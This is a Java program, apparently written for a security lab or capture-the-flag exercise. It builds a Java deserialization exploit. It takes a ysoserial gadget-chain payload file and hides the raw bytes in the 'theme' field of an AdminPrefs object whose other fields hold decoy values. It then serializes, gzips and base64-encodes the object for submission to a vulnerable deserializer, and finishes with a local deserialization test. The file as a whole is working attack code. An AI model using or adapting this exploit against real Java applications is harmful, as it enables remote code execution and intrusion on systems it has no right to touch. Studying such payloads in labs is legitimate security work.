import java.io.*;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;
import java.util.zip.GZIPInputStream;
import lab.actions.common.serializable.AdminPrefs;

public class AdminPrefsWrapper {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            System.out.println("Usage: java AdminPrefsWrapper <ysoserial-payload-file>");
            return;
        }

        // Read raw ysoserial payload bytes
        byte[] payloadBytes = readBytes(new File(args[0]));

        // Step 1: Print base64+gzipped payload *before* wrapping
        System.out.println("[+] Base64+Gzipped raw payload:");
        System.out.println(Base64.getEncoder().encodeToString(gzip(payloadBytes)));

        // Step 2: Wrap raw payload inside AdminPrefs
        AdminPrefs prefs = new AdminPrefs();
        prefs.favoriteFood = "no food";
        prefs.favoriteQuote = "This is fine.";
        prefs.favouriteBook = "Totally legit book";
        prefs.theme = payloadBytes; // Keep raw, don't deserialize

        printClassDescriptor(AdminPrefs.class);

        // Step 3: Serialize AdminPrefs object
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(prefs);
        oos.close();

        // Step 4: Gzip the serialized bytes
        byte[] serialized = baos.toByteArray();
        byte[] gzipped = gzip(serialized);

        // Step 5: Base64 encode the gzipped wrapped AdminPrefs
        String base64 = Base64.getEncoder().encodeToString(gzipped);

        System.out.println("[+] Final base64+gzipped serialized AdminPrefs:");
        System.out.println(base64);

        // Step 6: Attempt to deserialize locally for testing
        System.out.println("[+] Attempting local deserialization test...");
        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
        ObjectInputStream testOis = new ObjectInputStream(bais);
        AdminPrefs testPrefs = (AdminPrefs) testOis.readObject();
        testOis.close();

        System.out.println("[+] Local deserialization successful.");
        System.out.println("Theme payload type: " + testPrefs.theme.getClass());
    }

    private static byte[] readBytes(File file) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = fis.read(buffer)) > 0) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }

    private static byte[] gzip(byte[] input) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzipOut = new GZIPOutputStream(bos);
        gzipOut.write(input);
        gzipOut.close();
        return bos.toByteArray();
    }

    private static void printClassDescriptor(Class<?> clazz) {
        ObjectStreamClass osc = ObjectStreamClass.lookup(clazz);
        System.out.println("---- Class Descriptor ----");
        System.out.println("Class: " + osc.getName());
        System.out.println("serialVersionUID: " + osc.getSerialVersionUID());
        System.out.println("Fields:");
        for (ObjectStreamField field : osc.getFields()) {
            System.out.println("  - " + field.getName() + " (" + field.getType().getName() + ")");
        }
        System.out.println("--------------------------");
    }
}
